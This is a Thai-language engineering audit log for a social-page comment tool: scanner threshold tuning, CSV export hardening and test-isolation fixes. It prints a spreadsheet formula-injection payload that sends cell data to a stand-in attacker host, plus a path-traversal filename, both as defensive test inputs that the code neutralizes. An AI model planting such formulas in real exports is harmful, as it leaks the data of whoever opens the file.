## รอบที่ 1 — audit ตัวสแกน

### สิ่งที่ audit จับได้ และแรงกว่าที่คิดมาก

สร้างเพจไทยจำลองที่มี**แต่คนจริง** 400 บัญชี / 1,848 คอมเมนต์ ไม่มีบัญชีปลอม
ปนแม้แต่ตัวเดียว แล้วดูว่าตัวสแกนติดธงใครบ้าง — คำตอบที่ควรได้คือ **0**

| รอบ | เกณฑ์ | คนจริงที่ติดธงผิด |
|---|---|---|
| แรก | ข้อความ ≥15 ตัวอักษร · 3 บัญชี · ไม่ดูเวลา | **212 จาก 400** |
| ในคลังใหญ่ 20,000 คอมเมนต์ | เกณฑ์เดิม | **74%** ของบัญชีทั้งหมด |
| หลังแก้ | ข้อความ ≥30 · 5 บัญชี · ภายใน 2 ชม. | **0** |
| ในคลังใหญ่ 20,000 คอมเมนต์ | เกณฑ์ใหม่ | 0.30% (9 จาก 3,000) |

ถ้าปล่อยของเดิมออกไป คนใช้จะเปิดหน้านี้แล้วเห็นลูกค้าตัวเองครึ่งเพจถูกป้ายว่า
น่าสงสัย — เสียหายกว่าไม่มีฟีเจอร์นี้เลย

### ต้นเหตุ: 15 ตัวอักษรไทย = 4–5 คำ

นั่นคือความยาวของ**วลีสำเร็จรูป**ที่คนละคนพิมพ์เหมือนกันจริงๆ ทุกวัน:

- "ของถึงแล้วค่ะ ขอบคุณมาก"
- "สวยมากเลยค่ะ ชอบสีนี้"
- "สั่ง 2 ชิ้นค่ะ รบกวนทักกลับด้วยนะคะ"

30 ตัวอักษรคือประโยคที่มีเนื้อหาเฉพาะตัวจริงๆ ไม่ใช่วลีที่ใครก็พิมพ์

### ตัวที่แก้ปัญหาได้จริงคือ "เวลา" ไม่ใช่ "ความยาว"

ลำพังขยับความยาวยังลากคนจริงติดมาอยู่ดี ตัวตัดจริงคือเงื่อนไขเวลา:

> คนจริงที่บังเอิญพิมพ์ประโยคเหมือนกันจะกระจายกัน**เป็นวันเป็นสัปดาห์**
> ส่วนแคมเปญที่จ้างมาลง**พร้อมกันภายในไม่กี่นาทีถึงไม่กี่ชั่วโมง**

จึงเปลี่ยนจาก "นับบัญชีที่พิมพ์ข้อความนี้ทั้งหมด" เป็น
`maxDistinctInWindow()` — หน้าต่างเลื่อนที่นับ**บัญชีต่างคน**ที่พิมพ์ข้อความ
เดียวกันภายในกรอบเวลาเดียวกัน

### ค่าที่เปลี่ยน

| ค่า | เดิม | ใหม่ | เหตุผล |
|---|---|---|---|
| `MIN_DUPLICATE_LENGTH` | 15 | **30** | 15 คือความยาววลีสำเร็จรูป |
| `COORDINATED_ACCOUNTS` | 3 | **5** | 3 คนบังเอิญพิมพ์เหมือนกันเกิดขึ้นจริง |
| `COORDINATED_WINDOW_MS` | ไม่มี | **2 ชม.** | ← ตัวที่แก้ปัญหาได้จริง |
| `SELF_REPEAT_TIMES` | 3 (ไม่จำกัดเวลา) | **5 ใน 1 ชม.** | ลูกค้าเอาคำถามเดิมไปถามใต้หลายโพสต์เป็นเรื่องปกติ |

ทุกตัวขยับไปทาง "ไม่ชี้ดีกว่าชี้ผิด" — ยอมพลาดแคมเปญเล็กเพื่อไม่ให้กล่าวหา
ลูกค้าตัวจริงแม้แต่คนเดียว และแคมเปญ 3 บัญชีนั้นคนดูแลเพจอ่านคอมเมนต์เอง
ก็เห็นอยู่แล้ว ไม่ต้องมีเครื่องมือมาบอก

### สิ่งที่จงใจ**ไม่**เอามาเป็นสัญญาณ

| ไม่ใช้ | เพราะ |
|---|---|
| ไม่มีชื่อ / ไม่มีรหัสผู้ใช้ | นั่นคือการตั้งค่าความเป็นส่วนตัวของเจ้าตัว |
| ชื่อดูแปลก / อังกฤษปนตัวเลข | เดาจากชื่อคนคืออคติทางวัฒนธรรมล้วนๆ |
| คอมเมนต์เยอะ | นั่นคือแฟนตัวยง — audit ยืนยันว่าคนคอมเมนต์ 300 ครั้งไม่ติดธง |

และผลลัพธ์**ติดคำเตือนมาเสมอ** (`SCAN_CAVEAT_TH`) แม้ตอนไม่มีข้อมูล
ว่านี่ไม่ใช่คำตัดสิน และคนจริงก็ติดธงได้

### ผล audit รอบสุดท้าย

```
✓ เพจที่มีแต่คนจริง 400 บัญชี / 1848 คอมเมนต์ → ต้องไม่ติดธงเลย
✓ จับกลุ่มที่ประสานกันได้ครบทั้ง 8 บัญชี  จับได้ 8
✓ ไม่ลากคนจริงติดไปด้วย
✓ แฟนตัวยงคอมเมนต์ 300 ครั้ง (ข้อความสั้นซ้ำๆ) → ต้องไม่ติดธง
✓ สแกน 20,000 คอมเมนต์ / 3,000 บัญชี ภายใน 1.5 วินาที  ใช้จริง 40 ms
✓ เรียกซ้ำได้ผลเหมือนเดิมเป๊ะ
✓ คำเตือนติดมากับผลลัพธ์เสมอ แม้ตอนไม่มีข้อมูล
```

## รอบที่ 2 — audit ตัวส่งออก CSV

รอบแรกดูแต่ตัวสแกน รอบนี้เขียน `audit-export.mjs` ที่มี**ตัวอ่าน CSV แยกต่างหาก**
(ตาม RFC 4180) แล้วป้อนคอมเมนต์ที่ตั้งใจมาป่วน 10 แบบ เจอของจริงสองข้อ

### ข้อที่ 1 — Excel รันสูตรจากคอมเมนต์ของคนแปลกหน้า 🔴

คอมเมนต์ในเพจ Facebook **ใครก็พิมพ์ได้** ถ้ามีคนพิมพ์

```
=HYPERLINK("http://evil.example?d="&A1,"คลิกรับส่วนลด")
```

แล้วเราเขียนลงไฟล์ตรงๆ พอคนดูแลเพจเปิดไฟล์ใน Excel มันจะกลายเป็น**ลิงก์ที่แนบ
ข้อมูลจากช่องอื่นในไฟล์ส่งออกไปข้างนอก** คนเปิดเห็นแค่ข้อความชวนคลิก
ไม่มีทางรู้เลยว่ามันมาจากคอมเมนต์ของใคร

ที่พลาดคือคิดว่าครอบด้วย `"` แล้วจบ — **ไม่จบ** RFC 4180 บอกว่านั่นคือข้อความ
แต่ Excel / Google Sheets / LibreOffice ยังคำนวณให้อยู่ดี

**แก้:** `escapeFormula()` เติม `'` นำหน้าช่องที่ขึ้นต้นด้วย `= + - @` และ
แท็บ/CR (บางเวอร์ชันตัดช่องว่างนำหน้าทิ้งก่อนแล้วค่อยดูตัวถัดไป)

ราคาที่จ่าย: เปิดด้วย pandas หรือ Notepad จะเห็น `'` ติดมาหนึ่งตัว
(Excel กับ Sheets ซ่อนให้) — ยอมแลก เพราะอีกทางคือเปิดช่องให้คนแปลกหน้า
สั่งงานเครื่องคนดูแลเพจ

ตัวเลขที่ส่งเข้ามาเป็น `number` ไม่โดนเติม เพราะนั่นคือค่าที่**เราคำนวณเอง**
ไม่ใช่ข้อความของคนอื่น — ทำให้ค่าติดลบยังเป็นตัวเลขใน Excel

### ข้อที่ 2 — ไฟล์ 50,000 แถวใช้เวลา 4 วินาที 🟠

หน้าดาวน์โหลดตั้งเพดานไว้ที่ `MAX_ROWS = 50,000` และมันทำงานอยู่ใน
request handler ของ Next.js — 4 วินาทีคือหน้าค้าง 4 วินาที

ต้นเหตุ: `new Intl.DateTimeFormat()` ถูกสร้าง**ใหม่ทุกแถว**

วัดจริง: การสร้างตัวใหม่ราคา **68 µs** ต่อครั้ง × 50,000 = 3.4 วินาที
ส่วนการเรียก `formatToParts()` ซ้ำบนตัวเดิมเร็วกว่า **16 เท่า**

**แก้:** ย้ายออกมาสร้างครั้งเดียวต่อไฟล์ → **4,036 ms → 452 ms** (เร็วขึ้น 9 เท่า)

เป็นบั๊กที่เทสต์ความถูกต้องมองไม่เห็นเลย เพราะผลลัพธ์ถูกทุกตัวอักษร แค่ช้า
จึงเพิ่มเทสต์ที่จับเวลา 50,000 แถวไว้ (เกณฑ์หลวมๆ 2 วินาที เผื่อเครื่อง CI ช้า)

### ตรวจที่อื่นด้วยเลยว่าโดนแบบเดียวกันไหม

มีอีก 7 จุดในระบบที่สร้าง `Intl.DateTimeFormat` ในฟังก์ชันที่ถูกเรียกต่อรายการ
(`calendar.ts` · `sync.ts` · `best-time.ts` · `format.ts` · …) — **ไม่ใช่ปัญหา**
เพราะจำนวนรายการจริงอยู่ที่หลักร้อยถึงหลักพัน (โพสต์ในเดือน, ตัวเลขรายวันหนึ่งปี)
คิดเป็น 20–35 ms ไม่ใช่หลักวินาที

ตัวส่งออก CSV เป็นจุดเดียวที่มีเพดาน 50,000 เขียนไว้ตรงๆ จึงเป็นจุดเดียวที่เข้าเขตอันตราย
— บันทึกไว้ตรงนี้เพื่อไม่ให้ต้องมาไล่ตรวจซ้ำ และเพื่อเตือนถ้าวันหนึ่งจำนวนรายการ
ที่จุดพวกนั้นโตขึ้นหลักหมื่น

### ที่ตรวจแล้วผ่านตั้งแต่รอบแรก

- จุลภาค · เครื่องหมายคำพูด · ขึ้นบรรทัดใหม่ · CRLF กลางข้อความ · แท็บ ·
  อีโมจิ · ข้อความยาว 10,000 ตัวอักษร → อ่านกลับมาได้เหมือนเดิมทุกตัว
- BOM นำหน้า (ไม่มีแล้ว Excel บน Windows อ่านไทยเป็น `à¸ªà¸´à¸™`)
- ชื่อไฟล์: ตัด `\ / : * ? " < > |` ทิ้ง เก็บภาษาไทยไว้ · `../../etc/passwd`
  กลายเป็น `....etcpasswd` · ตัดที่ 40 ตัวอักษร
- ไม่มีข้อมูล → เหลือหัวตาราง ไม่ใช่ไฟล์เปล่า
- เขตเวลา: 17:30 UTC → `2026-08-11 00:30` เวลาไทย (ข้ามวันถูก)

## รอบที่ 3 — เทสต์ที่เชื่อไม่ได้

ตอนรัน `pnpm check` ระหว่างทาง เจอเทสต์ integration พัง 3 ตัว
(`expected 39 to be 3`) — สาเหตุคือมี**ข้อมูลตัวอย่างค้างอยู่ในฐานข้อมูล**

ล้างข้อมูลแล้วเทสต์ผ่าน แต่นั่นแก้อาการ ไม่ได้แก้เหตุ: เทสต์เขียนว่า

```ts
expect(await prisma.trackedComment.count()).toBe(3);   // นับทั้งตาราง
```

**เทสต์ที่พังเพราะข้อมูลของคนอื่นคือเทสต์ที่เชื่อไม่ได้** — บทเรียนเดียวกับ
call-log flush test ใน M-J

### พิสูจน์ก่อนแก้ แล้วพิสูจน์ซ้ำหลังแก้

เขียนสคริปต์ยัดข้อมูลปลอมของ workspace อื่นเข้าไป 50 คอมเมนต์ แล้วรันเทสต์:
**พัง 4 ตัว** เป็นการยืนยันว่าปัญหามีอยู่จริง ไม่ใช่แค่ทฤษฎี

แก้แล้วรันซ้ำภายใต้ข้อมูลปลอมชุดเดิม: **ผ่านครบ 15 ตัว**

### ข้อที่พังเผยปัญหาที่ใหญ่กว่าที่ตั้งใจหา

4 ตัวที่พังไม่ใช่เรื่องคอมเมนต์เลย แต่เป็น `duePages` — ซึ่งเป็นคิว
**ระดับเครื่อง** ที่มองข้าม workspace **โดยตั้งใจ** (cron ตัวเดียวดูแลทุกเพจ
ที่เฝ้าอยู่ ไม่ว่าของลูกค้าคนไหน)

ตรงนี้ต้องระวัง: **ห้ามใส่ตัวกรอง workspace ลงในโค้ดจริงเพื่อให้เทสต์ผ่าน**
เพราะจะทำให้ cron เลิกดึงเพจของลูกค้าคนอื่น จึงกรองที่ฝั่งเทสต์แทน
ด้วย `dueHere()` ที่จำ id ของเพจที่ตัวเองสร้าง

และต้องขอ `limit` เผื่อไว้เยอะ (10,000) เพราะถ้าขอไปน้อย เพจของคนอื่นจะกิน
โควตาจนเพจของเราไม่โผล่มาเลย — ตัวกรองไม่ทำให้เทสต์อ่อนลง เพราะสิ่งที่ตรวจคือ
**ลำดับ** ซึ่งการกรองรักษาลำดับสัมพัทธ์ไว้ครบ

ข้อ "จำกัดจำนวนตามที่ขอ" ยังเรียก `duePages` ตรงๆ เพราะสิ่งที่ตรวจคือสัญญาของ
`take` ล้วนๆ ("ขอ 2 ต้องได้ 2") ไม่เกี่ยวว่าแถวที่ได้เป็นของ workspace ไหน

ตรวจไฟล์ integration ที่เหลือทั้ง 4 ไฟล์ (83 เทสต์) ภายใต้ข้อมูลปลอมชุดเดียวกัน
— ผ่านหมด ไม่มีที่อื่นเป็นแบบนี้

## ตรวจของจริงผ่านเบราว์เซอร์

เปิดเซิร์ฟเวอร์จริง ใส่ข้อมูลตัวอย่างที่มีทั้งคนจริง แคมเปญ 6 บัญชี คนพิมพ์ซ้ำ
คนคอมเมนต์รัว บัญชีที่โดนสองสัญญาณ และ**คอมเมนต์ที่แฝงสูตร Excel มา** แล้วยิง
HTTP จริงทุกหน้า

- การ์ดบัญชีน่าสงสัย: จับครบทั้ง 3 สัญญาณ · แสดงระดับ "เข้าข่ายชัด" ตอนโดน
  2 สัญญาณ · บอกรายละเอียดว่าเห็นอะไร ไม่ใช่แค่ติดธง · คำเตือนขึ้นครบ
- ข้อความสั้น ("สนใจค่ะ") ซ้ำ 15 ครั้งจาก 3 บัญชี → **ไม่ติดธง** ตามที่ออกแบบ
- ลูกค้าปกติ 20 คน → **ไม่ติดธงเลย**
- CSV: 115 บรรทัด ทุกบรรทัด 5 คอลัมน์ · BOM ครบ · ชื่อไฟล์ไทยส่งแบบ RFC 5987
- **สูตรที่แฝงมาถูกกันไว้จริงในไฟล์ที่ดาวน์โหลดจากเซิร์ฟเวอร์** —
  ไม่มีช่องไหนในไฟล์เริ่มด้วย `= + - @` เลย
- 8 หน้าที่มีอยู่เดิมยังตอบ 200 · ไม่มี error ในล็อกเซิร์ฟเวอร์
